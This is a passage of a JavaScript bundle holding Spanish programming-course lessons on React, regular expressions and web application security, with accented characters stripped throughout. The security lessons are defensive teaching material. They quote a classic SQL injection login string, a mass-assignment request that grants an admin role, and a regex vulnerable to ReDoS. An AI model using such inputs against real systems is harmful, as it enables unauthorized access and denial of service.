*   **Server State:** Usa **React Query** o **SWR**. Manejan cach, reintentos y "stale-while-revalidate" automticamente.
*   **Client State:** Context o libreras atmicas (Zustand, Jotai).

## 5. Caso de Produccin: El Carrito Fantasma
**Bug:** Un usuario agrega un item, el contador sube, pero al refrescar desaparece. 
**Anlisis:** Falta de sincronizacin entre el estado local (Zustand) y el estado del servidor. 
**Solucin:** Optimistic Updates con React Query. Mostramos el cambio inmediatamente, pero si el servidor falla, hacemos rollback automticamente.

---

## Desafo
Investiga qu es "Immer" y cmo ayuda a simplificar los reducers de React cuando manejamos objetos profundamente anidados.
`,completed:!1},{id:"react-senior-errores-resiliencia",title:"Manejo de Errores y Resiliencia en Produccin",level:"senior",content:`# Leccin 23: Manejo de Errores y Resiliencia en Produccin

Una aplicacin Senior no es la que no tiene errores, sino la que sabe fallar con elegancia.

## 1. Error Boundaries
Son componentes de clase (s, la nica razn para seguir usando clases en React moderno) que capturan errores de JS en cualquier parte de su rbol de componentes hijos.

\`\`\`tsx
class MyErrorBoundary extends React.Component {
  componentDidCatch(error, info) {
    logErrorToService(error, info); // Sentry, LogRocket, etc.
  }
  render() {
    if (this.state.hasError) return <FallbackUI />;
    return this.props.children;
  }
}
\`\`\`

## 2. Granularidad de Fallos
No envuelvas toda la \`App\` en un solo Error Boundary. Si falla el widget del clima, no debera romperse el checkout de la tienda. Pon lmites de error en secciones crticas de forma independiente.

## 3. Manejo de Errores Asncronos
Los Error Boundaries **no** capturan errores en:
*   Event handlers (\`onClick\`).
*   Cdigo asncrono (\`setTimeout\`, \`fetch\`).
*   Server Side Rendering.
Para estos casos, debes usar \`try/catch\` manual o el manejo de errores de libreras como \`React Query\`.

## 4. Observabilidad: Sentry y compaa
En produccin, necesitas saber qu error tuvo el usuario. Configurar herramientas de tracking de errores y "Session Replay" es obligatorio para un Senior.

## 5. Pregunta Senior
**P:** "Cmo manejas una API que devuelve un 500 pero tu frontend espera un objeto?" 
**R:** Validando los esquemas de datos con libreras como **Zod** antes de pasarlos a los componentes. El tipado de TS es solo en compilacin; Zod te da seguridad en ejecucin.

---

## Desafo
Implementa una validacin con Zod para una respuesta de API y muestra un mensaje de error amigable si los datos no coinciden con la interfaz esperada.
`,completed:!1},{id:"react-senior-testing-senior",title:"Testing Strategies para Frontend Senior",level:"senior",content:`# Leccin 24: Testing Strategies para Frontend Senior

El testeo no es para ver si el cdigo funciona hoy, es para asegurar que no se rompa maana.

## 1. La Pirmide de Testing en React
1.  **Unit Tests (Vitest/Jest):** Funciones puras, helpers, lgica de reducers.
2.  **Integration Tests (React Testing Library):** Probar componentes interactuando. No probamos la implementacin interna, probamos la **interaccin del usuario**.
3.  **End-to-End (Playwright/Cypress):** Flujos completos (Login -> Compra -> Logout).

## 2. El Mantra de RTL
> "Cuanto ms se parezcan tus tests a la forma en que se usa el software, ms confianza te darn".

Evita testear el estado interno (\`wrapper.state()\`). Testea que si el usuario escribe en un input y pulsa un botn, aparece un texto en pantalla.

## 3. Mocking APIs (MSW)
**Mock Service Worker** es el estndar senior. En lugar de mockear \`fetch\` o \`axios\`, MSW levanta un "servidor" ficticio en el navegador del test. Esto permite que el resto del cdigo (incluyendo hooks y servicios) sea idntico al de produccin.

## 4. Visual Regression Testing
Usa herramientas como **Storybook** con Chromatic para detectar si un cambio en el CSS rompi el diseo de un componente en algn borde extrao.

## 5. Pregunta Senior
**P:** "Por qu es malo tener un coverage del 100%?"
**R:** Porque el coverage miente. Puedes tener el 100% de lneas ejecutadas pero 0% de casos de borde probados. Un Senior prioriza los caminos crticos sobre el porcentaje vaco.

---

## Desafo
Escribe un test para un componente de Login que verifique que el botn de "Enviar" se deshabilita mientras la peticin est en curso.
`,completed:!1},{id:"react-senior-evaluacion",title:"Evaluacin React Architecture & Performance",level:"senior",content:`# Evaluacin Final: React Architecture & Performance

Esta evaluacin simula una auditora tcnica de una aplicacin de gran escala.

## Seccin 1: Diagnstico de Performance

**Escenario:** Tienes un Dashboard con un grfico que se actualiza cada 500ms mediante WebSockets. El usuario nota que al escribir en el campo de bsqueda (que no tiene nada que ver con el grfico), las letras aparecen con retraso y el ventilador de la laptop se enciende.

1. Identifica las 3 posibles causas de este lag de renderizado.
2. Propn una solucin tcnica usando Hooks de React 18.
3. Explica cmo usaras el Profiler para confirmar tu hiptesis.

## Seccin 2: Diseo de Arquitectura

**Escenario:** Debes disear un sistema de notificaciones persistente (como el de Facebook o LinkedIn). Las notificaciones deben aparecer en un contador en el Header y tambin en un panel lateral.

1. Qu estrategia de manejo de estado elegiras y por qu? (Context, Zustand, o React Query).
2. Dibuja (en texto) la jerarqua de componentes y dnde vivira la lgica de sincronizacin con el servidor.

## Seccin 3: Refactorizacin Crtica

Tienes el siguiente cdigo legacy:
\`\`\`tsx
const DataItem = ({ id }) => {
  const [item, setItem] = useState(null);
  useEffect(() => {
    fetch(\`/api/items/\${id}\`).then(r => r.json()).then(setItem);
  }, [id]);
  return <div>{item?.name}</div>;
}

const List = ({ ids }) => {
  return ids.map(id => <DataItem id={id} />);
}
\`\`\`

**Problema:** Si \`ids\` tiene 50 elementos, se disparan 50 peticiones simultneas, causando el problema de "N+1 Waterfall" en el frontend.
**Misin:** Propn un refactor senior que solucione esto (puedes sugerir cambios en la API o en el patrn de fetching).

## Seccin 4: Casos de Borde en Produccin

Explica cmo manejaras una situacin donde un componente de terceros (que no puedes modificar) lanza un error fatal solo en navegadores Safari antiguos, haciendo que toda tu app se ponga blanca.

---

## Criterios de Aprobacin
* [ ] Capacidad de diagnstico profundo del Virtual DOM y Reconciliacin.
* [ ] Dominio de patrones de composicin sobre herencia o props drilling.
* [ ] Pensamiento crtico sobre el costo/beneficio de las dependencias.
* [ ] Enfoque proactivo hacia la resiliencia y el manejo de errores.
`,completed:!1,isProject:!0}]},P1={id:"regex",title:"Expresiones Regulares (Regex)",description:"Domina el arte de buscar, validar y extraer informacin de textos masivos con precisin milimtrica.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"regex-01-intro-regex",title:"Qu es Regex? El superpoder de buscar texto",level:"junior",content:`# Leccin 01: Qu es Regex? El superpoder de buscar texto

Las **Expresiones Regulares** (Regex) son una secuencia de caracteres que forma un patrn de bsqueda. Es como decirle a la computadora: "Busca algo que empiece con una letra mayscula, siga con 3 nmeros y termine con un punto".

## 1. Para qu sirven?
*   **Validacin:** Esto que escribi el usuario es realmente un email?
*   **Extraccin:** Sacar todos los nmeros de telfono de un documento de 500 pginas.
*   **Limpieza:** Borrar todos los espacios dobles de un texto.

## 2. Los Smbolos Bsicos (Literales y Metacaracteres)
*   \`abc\`: Busca exactamente las letras "abc".
*   \`.\`: Comodn. Coincide con cualquier carcter (menos salto de lnea).
*   \`\\d\`: Busca cualquier dgito (0-9).
*   \`\\w\`: Busca cualquier letra, nmero o guion bajo (carcter de palabra).
*   \`\\s\`: Busca cualquier espacio en blanco (espacios, tabs).

## 3. Anclas: El dnde
*   \`^\`: El inicio de la lnea.
*   \`$\`: El final de la lnea.

---

### Concepto Junior:
Al principio, una Regex parece un "lenguaje de marcianos" \`/\\d{3}-?\\d{3}/\`. Pero una vez que aprendes los smbolos, te das cuenta de que es la herramienta ms rpida del mundo para manipular texto.

### Ejercicio Mental 1:
Si tienes la Regex \`/hola/\`, coincidir con la palabra "Hola"? (Pista: Regex suele ser sensible a maysculas/minsculas por defecto).
|
`,completed:!1},{id:"regex-02-cuantificadores",title:"Cuantificadores y Clases de Caracteres",level:"junior",content:'# Leccin 02: Cuantificadores y Clases de Caracteres\n\nYa sabes buscar una letra o un nmero. Pero cmo buscas "varios nmeros seguidos"?\n\n## 1. Cuantificadores: Cuntos hay?\n*   `*`: Cero o ms veces.\n*   `+`: Una o ms veces.\n*   `?`: Cero o una vez (opcional).\n*   `{n}`: Exactamente `n` veces. (ej: `\\d{3}` busca 3 nmeros).\n*   `{min,max}`: Entre un mnimo y un mximo.\n\n## 2. Clases de Caracteres (Corchetes)\nPermiten definir un grupo de opciones para un solo carcter.\n*   `[aeiou]`: Cualquiera de esas vocales.\n*   `[a-z]`: Cualquier letra minscula de la A a la Z.\n*   `[A-Z0-9]`: Cualquier mayscula o nmero.\n*   `[^0-9]`: El `^` dentro de corchetes significa **negacin**. Busca cualquier cosa que NO sea un nmero.\n\n## 3. Escapado de caracteres\nQu pasa si quiero buscar un punto real `.`? Como el punto es un comodn, debemos ponerle una barra atrs: `\\.`. Esto vale para todos los smbolos especiales: `\\*`, `\\?`, `\\\\`.\n\n---\n\n### Caso Junior: Validar un ao\nPara buscar un ao (4 nmeros), usaramos `/\\d{4}/`. Si queremos que sea un ao que empiece con 1 o 2, usaramos `/[12]\\d{3}/`.\n\n### Ejercicio Prctico 2:\nEscribe una Regex que busque nmeros de telfono simples de 8 dgitos seguidos. (Ej: 44556677).\n',completed:!1},{id:"regex-03-grupos-y-lazy",title:"Grupos de Captura y Alternancia",level:"semi-senior",content:`# Leccin 03: Grupos de Captura y Alternancia

Como Semi-Senior, empiezas a extraer partes especficas del texto y crear patrones ms inteligentes.

## 1. Grupos de Captura \`()\`
Los parntesis sirven para dos cosas:
1.  **Agrupar:** Aplicar un cuantificador a varias cosas. \`(abc)+\` busca "abcabc".
2.  **Capturar:** Guardar esa parte para usarla despus. Si buscas una fecha \`(\\d{2})/\\d{2}/\\d{4}\`, el primer parntesis "captura" el da para que puedas usarlo en tu cdigo de JavaScript por separado.

## 2. Alternancia \`|\`
Es el "OR" de las Regex. 
*   \`perro|gato\`: Busca la palabra "perro" O la palabra "gato".
*   \`colou?r\`: (Recordatorio Junior) busca "color" o "colour".

## 3. Cuantificadores "Greedy" (Codiciosos) vs "Lazy"
Por defecto, las Regex intentan agarrar todo lo que pueden.
*   Texto: \`<div>Hola</div>\`
*   Regex \`/<div>.*<\\/div>/\`: Agarrar todo.
*   Si usamos \`.*?\`, se vuelve "Lazy" y se detiene en la primera coincidencia que encuentre.

---

### Misin Semi-Senior:
Aprender a extraer el nombre de usuario de una URL de perfil. 
Ej: de \`https://twitter.com/juan_perez\` solo queremos sacar \`juan_perez\`.

### Ejercicio 3:
Crea una Regex para validar una fecha en formato \`DD/MM/YYYY\`. Recuerda que el da solo puede empezar con 0, 1, 2 o 3.
|
`,completed:!1},{id:"regex-04-lookahead-behind",title:"Lookahead y Lookbehind (Aserciones)",level:"semi-senior",content:`# Leccin 04: Lookahead y Lookbehind (Aserciones)

Esta es la frontera entre un desarrollador que sabe un poco de Regex y uno profesional. Las aserciones permiten buscar algo **solo si** est seguido (o precedido) por otra cosa, pero sin incluir esa otra cosa en el resultado.

## 1. Lookahead Positivo \`(?=...)\`
Busca "X" solo si adelante tiene "Y".
*   \`\\d+(?=)\`: Busca nmeros solo si tienen el smbolo del euro al lado, pero el smbolo  no aparecer en el resultado de la bsqueda.

## 2. Lookahead Negativo \`(?!...)\`
Busca "X" solo si adelante NO tiene "Y".
*   Muy usado para validacin de contraseas: "Que tenga al menos un nmero".

## 3. Lookbehind \`(?<=...)\` y \`(?<!...)\`
Igual que el Lookahead, pero revisa lo que tiene atrs (hacia la izquierda).
*   \`(?<=\\$)\\d+\`: Busca nmeros que tengan el smbolo $ antes.

---

### Caso Real: Validacin de Password Robusta
Una contrasea que necesita: 8 caracteres, al menos una mayscula y al menos un nmero.
\`/(?=.*[A-Z])(?=.*\\d).{8,}/\`
Ves cmo cada parntesis "mira hacia adelante" buscando su condicin sin avanzar su posicin en el texto?

### Ejercicio 4:
Intenta escribir una Regex que busque palabras que NO terminen en "s".
|
`,completed:!1},{id:"regex-05-performance-seguridad",title:"Performance y Seguridad (ReDoS)",level:"senior",content:`# Leccin 05: Performance y Seguridad (ReDoS)

En el nivel Senior, una Regex mal escrita puede tirar abajo tu servidor de produccin. Literalmente.

## 1. El Catastrophic Backtracking
Cuando usas cuantificadores anidados (ej: \`(a+)+\`), y le pasas una cadena que casi coincide pero no del todo, el motor de Regex intentar millones de combinaciones para intentar que encaje.
*   **Consecuencia:** El CPU sube al 100% y el servidor deja de responder. A esto se le llama **ReDoS** (Regular Expression Denial of Service).

## 2. Cmo evitarlo
1.  Evita cuantificadores dentro de cuantificadores.
2.  S lo ms especfico posible. No uses \`.*\` si puedes usar \`[a-z]*\`.
3.  Usa herramientas de anlisis (como \`regex101.com\`) y fjate en el nmero de "Steps" (pasos). Si para una cadena corta hace 5.000 pasos, tu Regex es peligrosa.

## 3. Seguridad en el Backend
Nunca permitas que un usuario te enve una Regex personalizada para ejecutarla en tu servidor. Un atacante enviar una Regex diseada para causar Backtracking y congelar tu negocio.

---

### Visin Senior:
Un Senior prefiere escribir 10 lneas de cdigo de JavaScript legible para validar un dato complejo antes que escribir una Regex ilegible de 200 caracteres que nadie puede mantener.

### Ejercicio 5:
Busca en internet un ejemplo de Regex para validar un Email. Vers que son largusimas y complejas. Vale la pena usarlas o es mejor una Regex simple \`/^.+@.+\\..+$/\` y luego validar el resto con cdigo?
|
`,completed:!1},{id:"regex-06-practica-regex",title:"El Maestro de los Patrones",level:"senior",content:`# Evaluacin Final: El Maestro de los Patrones

Demuestra que dominas desde los smbolos bsicos hasta la seguridad en produccin.

---

## 1. Nivel Junior: El Limpiador de Cdigo
**Consigna:** Tienes un archivo con muchas lneas vacas (solo espacios). 
Qu Regex usaras para buscar todas esas lneas y poder borrarlas? (Pista: Inicio de lnea, espacios, final de lnea).

## 2. Nivel Semi-Senior: El validador de Matrculas
**Escenario:** Una matrcula de coche tiene el formato de 4 nmeros seguidos de 3 letras maysculas (ej: \`1234ABC\`). Las letras no pueden incluir vocales.
*Consigna:* Crea la Regex para validar este formato.

## 3. Nivel Senior: Anlisis de Riesgo
**Consigna:** Analiza esta Regex: \`/^([a-zA-Z0-9]+\\s?)*$/\`. 
1. Qu busca?
2. Por qu es peligrosa si se le pasa un texto de 1 milln de letras que termine en un carcter especial como \`@\`?
3. Cmo la arreglaras para que no sea vulnerable a ReDoS?

---

### Misin:
Un experto en Regex no es el que hace los patrones ms complejos, sino el que sabe usarlos con precisin quirrgica sin sacrificar la seguridad del sistema. 
|
`,completed:!1,isProject:!0}]},mD={id:"security",title:"Seguridad en Aplicaciones Web",description:"Domina los principios de la seguridad digital, desde la proteccin de contraseas hasta la defensa contra ataques avanzados.",completed:!1,lessons:[{id:"security-01-que-es-seguridad",title:"Qu es la Seguridad Web? - Protegiendo tu Castillo",level:"junior",content:`# Leccin 01: Qu es la Seguridad Web? - Protegiendo tu Castillo

En el mundo digital, tu aplicacin es como un castillo lleno de tesoros (datos de usuarios, dinero, informacin privada). La **Seguridad Web** es el conjunto de muros, fosos y guardias que impiden que los ladrones entren.

## 1. La mentalidad del desarrollador seguro
Un programador Junior suele pensar: "Por qu alguien querra hackear mi pequeo proyecto?". 
**Realidad:** Los atacantes no siempre buscan tu proyecto especficamente; usan robots que escanean miles de webs por minuto buscando errores conocidos. La seguridad no es un "extra", es parte de construir software profesional.

## 2. Los tres pilares: CIA
En seguridad hablamos de la trada **CIA** (por sus siglas en ingls):
*   **Confidencialidad:** Solo las personas autorizadas pueden ver los datos. (Que nadie lea tus mensajes privados).
*   **Integridad:** Los datos no pueden ser modificados por accidente o por un atacante. (Que nadie cambie el precio de un producto en el carrito).
*   **Disponibilidad:** La aplicacin debe seguir funcionando incluso bajo ataque. (Que no te tiren la web abajo).

## 3. Quines son los "Hackers"?
No todos usan una capucha en un stano. Muchos errores de seguridad son explotados por scripts automticos. Tu misin es hacer que el costo de hackearte sea mayor que el beneficio que obtendran.

---

### Concepto Junior:
La seguridad es como la higiene: si no te lavas las manos, eventualmente te enfermas. Si no cuidas tu cdigo, eventualmente te hackean.

### Ejercicio Mental 1:
Si guardas la contrasea de tus usuarios en una hoja de Excel en tu escritorio, qu pilares de la trada CIA ests poniendo en riesgo?
`,completed:!1},{id:"security-02-https-candado",title:"HTTPS y la importancia del Candadito",level:"junior",content:`# Leccin 02: HTTPS y la importancia del Candadito

Seguramente viste un candado verde en la barra de tu navegador. Eso significa que la conexin es segura (HTTPS). Pero, qu significa realmente?

## 1. HTTP vs HTTPS
*   **HTTP (Humo):** Los datos viajan en texto claro. Si ests en un caf enviando tu contrasea, cualquiera que est en la misma red Wi-Fi puede "escuchar" y leer tu clave. Es como enviar una carta sin sobre.
*   **HTTPS (Sobre sellado):** Los datos se **encriptan** antes de salir de tu compu. Si alguien los intercepta, solo ver un montn de letras y nmeros sin sentido. Solo el servidor tiene la llave para desencriptarlos.

## 2. Los Certificados SSL/TLS
Para tener HTTPS, el dueo del sitio debe demostrar que es quien dice ser mediante un certificado. Hoy en da es obligatorio y gratuito gracias a servicios como **Let's Encrypt**.

## 3. Por qu es vital para el SEO y la Confianza?
*   Google penaliza a los sitios que no tienen HTTPS (salen como "No Seguros").
*   Los navegadores modernos bloquean funciones (como la cmara o la ubicacin) si el sitio no es HTTPS.

---

### Misin Junior:
Nunca, bajo ninguna circunstancia, desarrolles una aplicacin que pida datos de login sin usar HTTPS en produccin.

### Ejercicio Prctico 2:
Entra a tu sitio favorito, haz clic en el candado de la URL y busca la opcin "Certificado". Quin emiti ese certificado y cundo vence?
`,completed:!1},{id:"security-03-passwords-hashing",title:"Manejo Seguro de Passwords y Hashing",level:"junior",content:`# Leccin 03: Manejo Seguro de Passwords y Hashing

Este es el error nmero 1 de los principiantes: guardar la contrasea tal cual el usuario la escribi. Si hackean tu base de datos, tienen las claves de todos!

## 1. El pecado capital: Texto Plano
**NUNCA** guardes: \`password: "123456"\`.
Si el atacante entra a tu DB, se lleva el tesoro sin esfuerzo.

## 2. La solucin: Hashing
Un **Hash** es una funcin que convierte un texto en un cdigo nico e irreversible.
*   Entrada: "perrito123" -> Salida: \`a7b82c91...\`
*   No puedes volver del cdigo a la palabra original.

## 3. Cmo funciona el Login?
1.  El usuario se registra con "perrito123".
2.  Tu servidor lo hashea y guarda \`a7b82c91...\`.
3.  Cuando el usuario vuelve, escribe "perrito123".
4.  Tu servidor vuelve a hashear lo que escribi. Si el resultado es \`a7b82c91...\`, sabemos que es l!

## 4. El toque profesional: Salting (Sal)
Si dos usuarios usan la misma clave "123456", tendran el mismo hash. Un atacante con una lista de hashes comunes (Rainbow Tables) los descubrira fcil.
*   **Salt:** Agregamos unos caracteres aleatorios nicos a cada contrasea antes de hashearla. As, aunque la clave sea la misma, el hash final ser diferente.

---

### Librera Recomendada (Node.js):
Usa siempre **bcrypt** o **argon2**. Son libreras diseadas para ser lentas a propsito, dificultando que un atacante pruebe millones de claves por segundo.

### Ejercicio Mental 3:
Si olvidas tu contrasea en un sitio y ellos te envan un mail diciendo: "Tu contrasea actual es: 123456", ese sitio es seguro o inseguro? Por qu?
`,completed:!1},{id:"security-04-intro-jwt",title:"Introduccin a JWT (JSON Web Tokens)",level:"junior",content:`# Leccin 04: Introduccin a JWT (JSON Web Tokens)

En las aplicaciones modernas, no solemos pedir la contrasea en cada clic. Una vez que el usuario se loguea, le damos un "Pase VIP" llamado **JWT**.

## 1. Qu es un JWT?
Es un trozo de texto encriptado que contiene informacin del usuario. Es como una entrada de cine: el guardia (tu servidor) no te pregunta tu nombre cada vez, solo mira tu entrada y ve que es vlida y que pagaste por esa pelcula.

## 2. Anatoma de un JWT
Tiene 3 partes separadas por puntos:
1.  **Header:** Dice que es un JWT.
2.  **Payload (Carga):** Los datos (ej: \`userId: 5\`). **Ojo!** Estos datos se pueden leer fcil, no guardes secretos aqu.
3.  **Signature (Firma):** Es el sello de seguridad. Solo tu servidor tiene la "llave" para crear esta firma. Si alguien intenta cambiar el \`userId\` en el payload, la firma deja de ser vlida y el servidor rechaza el token.

## 3. Dnde se guarda en el navegador?
Aqu hay una batalla clsica:
*   **LocalStorage:** Fcil de usar, pero vulnerable a hackers que usen scripts (XSS).
*   **Cookies HttpOnly:** Ms seguras porque el cdigo de JavaScript no las puede leer, solo el servidor.

---

### Concepto Clave:
Un JWT es como un cheque: si alguien te lo roba, puede cobrarlo (usar tu cuenta) hasta que el cheque venza. Por eso los tokens deben durar poco tiempo (ej: 15 minutos).

### Ejercicio Prctico 4:
Entra a [jwt.io](https://jwt.io), pega un token cualquiera (hay uno de ejemplo ah) y mira qu dice el Payload. Puedes ver el nombre del usuario ficticio?
`,completed:!1},{id:"security-05-errores-comunes",title:"Errores Comunes y Variables de Entorno",level:"junior",content:`# Leccin 05: Errores Comunes y Variables de Entorno

Para cerrar el nivel Junior, vamos a ver cmo los principiantes suelen "entregar las llaves" de su aplicacin sin darse cuenta.

## 1. Subir Secretos a GitHub
Nunca, jams, pongas una clave de API, una contrasea de DB o tu clave secreta de JWT dentro de tu cdigo.
*   **Error:** \`const SECRET = "mi-clave-super-secreta-123";\`
*   **Solucin:** Usa un archivo \`.env\` y agrgalo al \`.gitignore\`. Tu cdigo debe leerlo as: \`process.env.JWT_SECRET\`.

## 2. Mensajes de error demasiado detallados
*   **Error:** "Error: La contrasea para el usuario juan@gmail.com es incorrecta".
*   **Ataque:** Ahora el hacker sabe que el email "juan@gmail.com" existe en tu sistema!
*   **Solucin:** "Email o contrasea incorrectos". No des pistas de qu parte fall.

## 3. Confiar en el Cliente (Frontend)
Nunca asumas que porque tu formulario en React valida que el email sea correcto, el servidor recibir un email correcto.
*   **Regla de Oro:** Los atacantes pueden saltearse tu frontend y enviarle basura a tu backend directamente. **Siempre valida todo de nuevo en el servidor.**

## 4. No limitar los intentos (Fuerza Bruta)
Si permites que alguien intente loguearse 1 milln de veces por segundo, eventualmente adivinar la clave.
*   **Solucin:** Bloquea la cuenta o pon un tiempo de espera despus de 5 intentos fallidos.

---

### Resumen del Nivel Junior:
1. Usa HTTPS siempre.
2. Hashea las contraseas con bcrypt/argon2.
3. No subas claves a GitHub (usa .env).
4. Desconfa de todo lo que venga del usuario.

### Ejercicio Final:
Busca en tu proyecto actual cualquier cadena de texto que sea una "clave" o "secreto". Crea un archivo \`.env\`, muvela ah y asegrate de que est en el \`.gitignore\`.
`,completed:!1},{id:"security-06-authn-authz",title:"Autenticacin vs Autorizacin (RBAC)",level:"semi-senior",content:`# Leccin 06: Autenticacin vs Autorizacin (RBAC)

Como Semi-Senior, ya no solo verificas "quin es" el usuario, sino "qu puede hacer". Estos son dos procesos distintos que ocurren en cascada.

## 1. Autenticacin (AuthN)
Es el proceso de verificar la identidad. Eres quien dices ser?
*   **Herramientas:** Login, Contraseas, MFA (2FA), Biometra.

## 2. Autorizacin (AuthZ)
Es el proceso de verificar permisos. Ya sabemos que eres "Juan", pero tienes permiso para borrar este post?
*   **Herramientas:** Roles, Permisos, Listas de Control de Acceso (ACL).

## 3. RBAC (Role-Based Access Control)
Es la forma ms comn de manejar la autorizacin en aplicaciones profesionales.
1.  **Usuarios** tienen **Roles** (ej: Admin, Editor, Viewer).
2.  **Roles** tienen **Permisos** (ej: \`edit_post\`, \`delete_user\`).
**Regla de Oro:** En tu cdigo, no verifiques el Rol (\`if user.role == 'admin'\`), verifica el Permiso (\`if user.can('delete_post')\`). Esto hace que tu sistema sea mucho ms flexible.

---

### Caso Real:
Un usuario con rol "Soporte" puede ver los datos de los clientes pero no editarlos. Si maana decides que "Soporte" tambin debe poder editar, solo cambias la configuracin del Rol en un lugar, no en 50 archivos del cdigo.

### Ejercicio 6:
Disea una tabla de permisos para una aplicacin de Hospital. Qu permisos le daras a un "Mdico", a un "Enfermero" y a un "Paciente"?
`,completed:!1},{id:"security-07-jwt-avanzado",title:"JWT Avanzado y Refresh Tokens",level:"semi-senior",content:`# Leccin 07: JWT Avanzado y Refresh Tokens

En el nivel Junior aprendiste que el JWT es un token de acceso. Pero hay un problema: si el token dura mucho, es peligroso; si dura poco, el usuario tiene que loguearse a cada rato.

## 1. El ciclo de vida de los Tokens
La solucin profesional es usar dos tokens diferentes:
*   **Access Token:** Es corto (ej: 15 minutos). Se usa para cada peticin a la API.
*   **Refresh Token:** Es largo (ej: 7 das). Se usa solo para pedir un nuevo Access Token cuando el anterior expira.

## 2. Ventaja de Seguridad
Si un atacante roba el Access Token, solo tiene 15 minutos de acceso. El Refresh Token debe estar guardado de forma hiper-segura (Cookie HttpOnly y vinculada a la IP/Dispositivo) para que no sea fcil de robar.

## 3. Revocacin de Sesiones
Con JWT puros (stateless), no puedes "cerrar la sesin" de un usuario desde el servidor. Si quieres poder banear a un usuario o cerrar sus sesiones, debes guardar el ID del Refresh Token en una base de datos (como Redis) para poder invalidarlo.

---

### Lo que hace un Semi-Senior:
Implementa un "Silent Refresh" en el frontend. Si la API devuelve un error de token expirado, el frontend pide uno nuevo automticamente usando el Refresh Token sin que el usuario se de cuenta.

### Ejercicio 7:
Por qu es una mala idea guardar el Refresh Token en LocalStorage? Investiga qu es el ataque XSS y cmo se relaciona con esto.
`,completed:!1},{id:"security-08-cors-explicado",title:"CORS - Desenmascarando al villano",level:"semi-senior",content:`# Leccin 08: CORS - Desenmascarando al villano

CORS (Cross-Origin Resource Sharing) es, probablemente, el error que ms dolores de cabeza causa a los desarrolladores. Pero no es tu enemigo; es una de las protecciones ms importantes del navegador.

## 1. Por qu existe CORS?
Imagina que ests logueado en \`tu-banco.com\`. Si entras a una pgina maliciosa \`virus.com\`, esa pgina podra intentar hacer un \`fetch\` a \`tu-banco.com/transferir-dinero\`. 
Sin el CORS, el navegador dejara que esa peticin pase. El **CORS** es el navegador preguntndole al banco: "Dejas que este sitio raro te pida cosas?".

## 2. El "Preflight" (OPTIONS)
Cuando haces una peticin compleja (ej: con un JSON o un token), el navegador primero enva una peticin automtica de tipo \`OPTIONS\`. 
*   Si el servidor responde con los encabezados correctos de "Acepto", el navegador enva la peticin real. 
*   Si el servidor no responde o no te tiene en la lista blanca, el navegador bloquea la peticin.

## 3. Configuracin Correcta (Backend)
*   **Error fatal:** \`Access-Control-Allow-Origin: *\` (Aceptas a cualquiera).
*   **Correcto:** Configura una lista blanca exacta de tus dominios (ej: \`https://mi-app.com\`).

---

### Misin Semi-Senior:
Nunca desactives el CORS para "solucionar el bug". Configralo correctamente en tu servidor usando libreras como \`cors\` en Express, especificando los mtodos (GET, POST, etc.) y los orgenes permitidos.

### Ejercicio 8:
Si tu frontend corre en \`localhost:3000\` y tu backend en \`localhost:5000\`, por qu ocurre un error de CORS si ambos estn en tu misma computadora?
`,completed:!1},{id:"security-09-owasp-ataques",title:"OWASP Top 10 y Ataques Crticos",level:"senior",content:`# Leccin 09: OWASP Top 10 y Ataques Crticos

Como Senior, diseas sistemas asumiendo que el atacante ya est adentro. Debes conocer las vulnerabilidades ms crticas segn el **OWASP** (Open Web Application Security Project).

## 1. Inyeccin (SQL y ms)
Ocurre cuando pasas datos del usuario directamente a una consulta de base de datos sin filtrar.
*   **Ataque:** El usuario escribe \`' OR 1=1 --\` en el campo de login y logra entrar sin contrasea.
*   **Defensa Senior:** Usa **Consultas Preparadas** (le paso los datos como parmetros separados, nunca pegando strings).

## 2. XSS (Cross-Site Scripting)
El atacante logra inyectar cdigo JavaScript malicioso en tu pgina que otros usuarios ven.
*   **Consecuencia:** Roban cookies de sesin, redirigen usuarios o cambian el contenido de la web.
*   **Defensa Senior:** Sanitiza todas las entradas y usa **Content Security Policy (CSP)** para decirle al navegador qu scripts puede ejecutar y cules no.

## 3. Broken Access Control
Es cuando un usuario puede acceder a datos que no son suyos simplemente cambiando un ID en la URL. (Ej: \`mi-app.com/factura/100\` -> cambio a \`101\` y veo la del vecino).
*   **Defensa Senior:** Siempre verifica la propiedad del recurso en el backend: \`WHERE id = facturaId AND userId = userLogueado\`.

---

### Visin Senior:
La seguridad no es una capa externa, es una propiedad del diseo. Un Senior aplica el principio de **Mnimo Privilegio**: cada parte del sistema solo tiene el acceso estrictamente necesario.

### Ejercicio 9:
Investiga qu es la vulnerabilidad **Log4Shell**. Por qu fue tan catastrfica y cmo se relaciona con la "Inyeccin"?
`,completed:!1},{id:"security-10-api-security",title:"Seguridad en APIs y Rate Limiting",level:"senior",content:`# Leccin 10: Seguridad en APIs y Rate Limiting

Tu API es la puerta trasera de tu aplicacin. Si alguien la descubre, puede intentar atacarla directamente sin pasar por tu bonito frontend en React.

## 1. Rate Limiting (Limitador de Velocidad)
Si permites que cualquier IP pida 10.000 datos por segundo, tu servidor se caer (Ataque DoS).
*   **Implementacin Senior:** Usa libreras como \`express-rate-limit\` o configuraciones de Nginx para limitar por IP o por usuario (ej: mximo 100 peticiones por minuto).

## 2. Mass Assignment (Asignacin Masiva)
Ocurre cuando recibes un objeto JSON y lo guardas directo en la DB.
*   **Ataque:** El usuario enva \`{ "nombre": "Juan", "role": "admin" }\`. Si tu cdigo hace \`User.update(req.body)\`, el usuario se acaba de hacer administrador.
*   **Defensa Senior:** Usa una lista blanca de campos permitidos. Nunca guardes el objeto completo del usuario sin filtrar.

## 3. Seguridad en los Encabezados (Headers)
Usa **Helmet.js** para ocultar qu tecnologa usas (ej: ocultar el header \`X-Powered-By: Express\`) y configurar protecciones automticas del navegador.

---

### Lo que hace un Senior:
Implementa **Auditora de Logs**. Cada accin sensible (cambio de contrasea, borrado de datos) debe quedar registrada: "Quin, Cundo y Desde qu IP". Esto es vital para investigar si hubo un hackeo despus de que ocurri.

### Ejercicio 10:
Qu diferencia hay entre un ataque de **DoS** y uno de **DDoS**? Cmo te protegeras de un DDoS masivo si tu servidor es pequeo?
`,completed:!1},{id:"security-11-hardening-audit",title:"Production Hardening y Auditora",level:"senior",content:`# Leccin 11: Production Hardening y Auditora

Llevar una aplicacin a produccin es como ponerla en un campo de batalla. Un Senior realiza un proceso de **Hardening** (fortalecimiento) antes de lanzar.

## 1. Secrets Management Avanzado
En produccin no usamos archivos \`.env\` en el disco. Usamos servicios como **AWS Secrets Manager**, **HashiCorp Vault** o las variables de entorno inyectadas de Vercel/Render. Esto evita que si alguien entra al servidor, pueda leer tus claves.

